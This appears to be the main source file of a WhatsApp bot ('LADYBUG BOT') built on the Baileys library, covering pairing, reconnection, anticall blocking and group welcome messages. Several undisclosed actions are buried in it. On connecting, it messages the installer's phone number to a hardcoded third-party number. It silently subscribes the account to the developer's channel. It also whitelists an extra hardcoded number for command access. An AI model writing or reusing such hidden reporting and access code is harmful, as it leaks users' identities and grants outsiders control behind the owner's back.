/*

 ▀▀█▀▀ █░▄▀ █▀▄▀█   █▀▀█ █▀▀▀█ ▀▀█▀▀
 ░▒█░░ █▀▄░ █▒█▒█   █▀▀▄ █░░▒█ ░▒█░░
 ░▒█░░ █░▒█ █░░▒█   █▄▄█ █▄▄▄█ ░▒█░░

© TKM-mods
WhatsApp Me : 263775571820

 - Source ↓
 - t.me/TKM-mods
 - wa.me/263775571820
 - https://whatsapp.com/channel/0029Vb5lvXDCMY0EyIW8Yf19

*/

const fs = require('fs');
const chalk = require('chalk');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const colors = require('color');
require("./all/global");
const func = require("./all/place");
const readline = require("readline");
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"));
const { sleep } = require("./all/myfunc.js");
const autofixcreds = require('./all/autofixcreds');

const usePairingCode = true;
const autobio = true; // Enable or disable autobio

const question = (text) => {
 const rl = readline.createInterface({
 input: process.stdin,
 output: process.stdout
 });
 return new Promise((resolve) => {
 rl.question(text, resolve);
 });
};

async function startSesi() {
 const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
 const { state, saveCreds } = await useMultiFileAuthState(`./all/session`)
 const { version, isLatest } = await fetchLatestBaileysVersion()

 const connectionOptions = {
 printQRInTerminal: !usePairingCode,
 version,
 logger: pino({ level: "fatal" }),
 auth: state,
 browser: ["Ubuntu", "Chrome", "20.0.04"],
 getMessage: async (key) => {
 if (store) {
 const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
 return msg?.message || undefined
 }
 return {
 conversation: 'WhatsApp Bot By Ntando-mods'
 }
 }
 }

 const Ladybug = func.makeWASocket(connectionOptions)
 if (usePairingCode && ! Ladybug.authState.creds.registered) {
 const phoneNumber = await question(chalk.cyan.bold('Enter the WhatsApp number starting with263\nExample :263xxxx\n'))
 const code = await Ladybug.requestPairingCode(phoneNumber.trim())
 console.log(`${chalk.cyan.bold('Your Verification Code')} : ${chalk.redBright.bold(code.split("").join(" "))}`)
 }
 store?.bind(Ladybug.ev)

 Ladybug.ev.on('connection.update', async (update) => {
 const { connection, lastDisconnect } = update
 if (connection === 'close') {
 const reason = new Boom(lastDisconnect?.error)?.output.statusCode
 console.log(color(lastDisconnect.error, 'deeppink'))
 if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
 console.log('Stream Errored, trying to reconnect...')
 startSesi()
 } else if (reason === DisconnectReason.badSession) {
 console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
 startSesi()
 } else if (reason === DisconnectReason.connectionClosed) {
 console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
 startSesi()
 } else if (reason === DisconnectReason.connectionLost) {
 console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
 startSesi()
 } else if (reason === DisconnectReason.connectionReplaced) {
 console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
 startSesi()
 } else if (reason === DisconnectReason.loggedOut) {
 console.log(color(`Device Logged Out, Please Scan Again And Run.`))
 startSesi()
 } else if (reason === DisconnectReason.restartRequired) {
 console.log(color('Restart Required, Restarting...'))
 startSesi()
 } else if (reason === DisconnectReason.timedOut) {
 console.log(color('Connection TimedOut, Reconnecting...'))
 startSesi()
 }
 } else if (connection === "connecting") {
 console.log(chalk.cyan.bold('Connecting to the server...'))
 } else if (connection === "open") {
 let teksnotif = `*LADYBUG BOT* Successfully Connected to WhatsApp Number ${Ladybug.user.id.split(":")[0]}\nServer: Ubuntu20.04`
 Ladybug.sendMessage("6287780787401@s.whatsapp.net", { 
 text: teksnotif, 
 contextInfo: { 
 externalAdReply: { 
 thumbnailUrl: 'https://picsum.photos/200/300', 
 title: 'LADYBUG BOT', 
 body: 'Connected Successfully', 
 renderLargerThumbnail: true, 
 sourceUrl: 'https://picsum.photos/200/300', 
 mediaType:1 
 } 
 } 
 })
 console.log(chalk.cyan.bold('LADYBUG Bot Successfully Connected to the server'))
 const linksal = ["0029Vb5lvXDCMY0EyIW8Yf19"]

 const folldate = async functions => {
 for (const newslletterss of functions) {
 try {
 await sleep(3000);
 const saluranWa = await Ladybug.newsletterMetadata("invite", newslletterss);
 await sleep(3000);
 await Ladybug.newsletterFollow(saluranWa.id);
 } catch (error) {
 console.error("❌ Failed to join channel ID: " + newslletterss, error);
 }
 }
 };
 (async () => {
 await folldate(linksal);
 })();

 if (autobio) {
 let bioStatus = `LADYBUG BOT | Online`;
 await Ladybug.updateProfileStatus(bioStatus);
 console.log(chalk.cyan.bold('Autobio updated successfully'));
 setInterval(async () => {
 const newBio = `LADYBUG BOT | Online | ${new Date().toLocaleString()}`;
 await Ladybug.updateProfileStatus(newBio);
 },60 *60 *1000); // Update autobio every hour
 }
 }
 })

 Ladybug.ev.on('call', async (user) => {
 if (!global.anticall) return
 for (let ff of user) {
 if (ff.isGroup == false) {
 if (ff.status == "offer") {
 let sendcall = await Ladybug.sendMessage(ff.from, { text: `@${ff.from.split("@")[0]} Sorry, I will block you because the owner bot has activated the feature *Anticall*\nIf it was unintentional, please contact the owner to unblock this`, contextInfo: { mentionedJid: [ff.from], externalAdReply: { showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO" } } }, { quoted: null })
 Ladybug.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
 await sleep(10000)
 await Ladybug.updateBlockStatus(ff.from, "block")
 }
 }
 }
 })

 Ladybug.ev.on('messages.upsert', async (chatUpdate) => {
 try {
 m = chatUpdate.messages[0]
 if (!m.message) return
 m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
 if (m.isBaileys) return
 if (m.key && m.key.remoteJid === 'status@broadcast') {
 if (global.autoreadsw) Ladybug.readMessages([m.key])
 }
 let fill = [global.owner, "263777124998"]
 if (!Ladybug.public && !fill.includes(m.key.remoteJid.split("@")[0]) && !m.key.fromMe && chatUpdate.type === 'notify') return
 if (global.autoread) Ladybug.readMessages([m.key])
 m = func.smsg(Ladybug, m, store)
 require("./Ladybug")(Ladybug, m, store)

 // Ping Command with Image
 if (m.text && m.text.startsWith("!ping")) {
 const msg = await Ladybug.sendMessage(m.chat, { image: { url: 'https://i.pinimg.com/originals/f6/93/8e/f6938e86d2c0d615fba7b6b6d5e0a4a1.jpg' }, caption: 'Pinging...' }, { quoted: m })
 await Ladybug.sendMessage(m.chat, { image: { url: 'https://i.pinimg.com/originals/f6/93/8e/f6938e86d2c0d615fba7b6b6d5e0a4a1.jpg' }, caption: 'Pong!' }, { quoted: msg })
 }
 } catch (err) {
 console.log(err)
 }
 })

 Ladybug.ev.on('group-participants.update', async (anu) => {
 if (!welcome.includes(anu.id)) return
 let botNumber = await Ladybug.decodeJid(Ladybug.user.id)
 if (anu.participants.includes(botNumber)) return
 try {
 let metadata = await Ladybug.groupMetadata(anu.id)
 let namagc = metadata.subject
 let participants = anu.participants
 for (let num of participants) {
 let check = anu.author !== num && anu.author.length >1
 let tag = check ? [anu.author, num] : [num]
 try {
 ppuser = await Ladybug.profilePictureUrl(num, 'image')
 } catch {
 ppuser = 'https://files.catbox.moe/1axwum.jpg'
 }
 if (anu.action == 'add') {
 Ladybug.sendMessage(anu.id, { text: check ? `@${anu.author.split("@")[0]} Has Added @${num.split("@")[0]} To This Group` : `Hello, Bro/Sis @${num.split("@")[0]} Welcome To *${namagc}*`,
 contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: ppuser, mediaType:1 } } })
 } else if (anu.action == 'remove') {
 Ladybug.sendMessage(anu.id, { text: check ? `@${anu.author.split("@")[0]} Has Removed @${num.split("@")[0]} From This Group` : `@${num.split("@")[0]} Has Left From This Group`,
 contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: ppuser, mediaType:1 } } })
 } else if (anu.action == "promote") {
 Ladybug.sendMessage(anu.id, { text: `@${anu.author.split("@")[0]} Has Made @${num.split("@")[0]} An Admin In This Group`,
 contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: ppuser, mediaType:1 } } })
 } else if (anu.action == "demote") {
 Ladybug.sendMessage(anu.id, { text: `@${anu.author.split("@")[0]} Has Terminated @${num.split("@")[0]} As An Admin In This Group`,
 contextInfo: { mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: ppuser, mediaType:1 } } })
 }
 }
 } catch (err) {
 console.log(err)
 }
 })

 Ladybug.public = true

 Ladybug.ev.on('creds.update', saveCreds)
 fs.writeFileSync('./all/session/creds.json', JSON.stringify(state.creds, null,2))
 return Ladybug
}

startSesi()

process.on('uncaughtException', function (err) {
 console.log('Caught exception: ', err)
});

// Keep the process alive
setInterval(() => {
 // You can add some light task here to keep the process alive
},60000); // every1 minute
